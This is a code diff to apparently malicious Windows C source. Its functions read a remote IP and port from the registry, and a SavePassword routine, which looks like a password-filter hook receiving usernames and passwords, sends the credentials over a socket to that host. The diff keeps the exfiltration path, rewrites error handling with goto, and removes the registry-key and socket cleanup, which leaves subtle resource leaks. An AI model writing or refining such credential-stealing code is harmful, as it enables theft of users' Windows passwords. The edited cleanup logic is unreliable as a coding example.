@@ -35,7 +35,6 @@ DWORD getPtReg()
 			return port;
 		}
 	}
-	RegCloseKey(hkey);
 	return 80;
 }
 
@@ -83,7 +82,6 @@ char * getIPReg()
 			return ipa;
 		}
 	}
-	RegCloseKey(hKey);
 	return ipa;
 }
 
@@ -120,12 +118,10 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
 	{
 		printf("Could not create socket : %d", WSAGetLastError());
-		WSACleanup();
-		return 1;
+		goto error;
 	}
 
 	printf("Socket created.\n");
-
 
 	server.sin_addr.s_addr = inet_addr(ip);
 	server.sin_family = AF_INET;
@@ -135,8 +131,7 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
 	{
 		puts("connect error");
-		WSACleanup();
-		return 1;
+		goto error;
 	}
 
 	puts("Connected");
@@ -145,14 +140,15 @@ int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	if (send(s, creds, strlen(creds), 0) < 0)
 	{
 		puts("Send failed");
-		WSACleanup();
-		return 1;
+		goto error;
 	}
 	puts("Data Send\n");
 
-	WSACleanup();
-
 	return 0;
+
+	error: 
+	WSACleanup();
+	return 1;
 }
 
 
